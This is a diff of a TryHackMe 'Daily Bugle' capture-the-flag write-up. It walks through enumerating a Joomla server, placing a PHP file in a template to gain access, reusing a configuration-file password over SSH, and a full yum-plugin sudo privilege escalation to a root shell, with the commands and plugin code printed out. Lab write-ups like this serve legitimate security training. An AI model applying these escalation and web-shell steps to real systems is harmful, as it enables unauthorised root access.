@@ -1,29 +1,32 @@
-You can access the room from https://tryhackme.com/room/dailybugle
+## Daily Bungle 
+You can access the room from** https://tryhackme.com/room/dailybugle**__
 Let’s Start the Machine…
 Before getting into the box if you are not using AttackBox make sure you are properly connected to openvpn server and give 2 minutes for the target machine to configure.
-Initial Enumeration
+**Initial Enumeration
+** 
 Lets start by enumerating the box by port scanning using nmap. Use the following command
                 >   sudo nmap -sV <machine_ip>
 The port scanning went well and we have 3 open ports
 
-nmap Scan Report
-Port 22 - Its an SSH port and its not gonna give us anything to start.
-Port 80 - A Web server is running and it might help us to get more information. So lets go check the website.
-Port 3306 - Its a default port used for the MySQL protocol and the database system is MariaDB.
+_nmap Scan Report_
+**Port 22** - Its an SSH port and its not gonna give us anything to start.
+**Port 80 **- A Web server is running and it might help us to get more information. So lets go check the website.
+**Port 3306** - Its a default port used for the MySQL protocol and the database system is MariaDB.
 Looking at the website and we got the answer for the first question !!!
 
-Website Home Page
+**Website Home Page
+**
 So looking around the website nothing seems informative.So lets run a gobuster in the website.
  > gobuster dir -u <machine_ip> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
 
-Gobuster Directory List
-So there is a directory for admin(Administrator) and let’s go and check that directory before that we want to check the /robots.txt
+**Gobuster Directory List
+**So there is a directory for admin(Administrator) and let’s go and check that directory before that we want to check the /robots.txt
 From the /robots.txt we get to know that this site is running Joomla CMS, and since the second question is about it’s version. Let’s use CMS scanning tools. There are several tools to enumerate a CMS and am using CMSeeK
 Use CMSeeK with the following command to enumerate the website.
    >   sudo python3 <path-to-cmseek.py> -u http://<machine-ip>
 
-CMSeeK CMS Details
-Now we got the version of Joomla. Answer the second question and lets check the Administrator directory.
+**CMSeeK CMS Details
+** Now we got the version of Joomla. Answer the second question and lets check the Administrator directory.
 
 Joomla Administrator Login Page
 Hooray we found a Joomla login page. But we only got a user name “jonah” mentioned in the box. So lets go and check for any vulnerabilities in Joomla <version>
@@ -71,7 +74,7 @@ Same time we must run the browser with the following url or use tool curl follow
        http://<machine-ip>/templates/protostar/<filename>.php
 
 
-User Named as ‘jjameson’
+User Named as **‘jjameson’**
 Checking the home directory there is a user with the name ‘jjameson’ but we don't have password to get into it.
 So after checking around for some information to exploit the machine found a configuration.php file in the webserver directory /var/www/html
 
@@ -80,7 +83,7 @@ From nmap we know that port 22 is open which is used for SSH, so lets ssh into t
                >  ssh jjameson@<machine-ip>
 We will be prompted for the password and give the password we found from config file.
 
-SSH
+**SSH**
 Now we logged in as jjameson and we got our first flag user.txt . For the root.txt flag we need to do privilege escalation.
 Privilege Escalation
 Lets check our existing sudo privileged command list by running the sudo -l
@@ -88,8 +91,8 @@ Lets check our existing sudo privileged command list by running the sudo -l
   > sudo -l Output
 That’s it , we found a command that can run as sudo without password.
 There is a privilege escalation using yum in gtfobins
-TF=$(mktemp -d)
-cat >$TF/x<<EOF
+    > TF=$(mktemp -d)
+   >  cat >$TF/x<<EOF
 [main]
 plugins=1
 pluginpath=$TF
@@ -102,18 +105,18 @@ enabled=1
 EOF
 
 > cat >$TF/y.py<<EOF
-import os
-import yum
-from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
-requires_api_version='2.1'
-def init_hook(conduit):
-  os.execl('/bin/sh','/bin/sh')
+> import os
+> import yum
+> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+> requires_api_version='2.1'
+> def init_hook(conduit):
+>  os.execl('/bin/sh','/bin/sh')
 EOF
 
-sudo yum -c $TF/x --enableplugin=y
+>sudo yum -c $TF/x --enableplugin=y
 Just copy and paste the code to jjameson shell .
 
-yum privilege escalation
+>yum privilege escalation
 We got the root shell. Go and grab the root.txt flag from /root/root.txt
 
 Root Flag
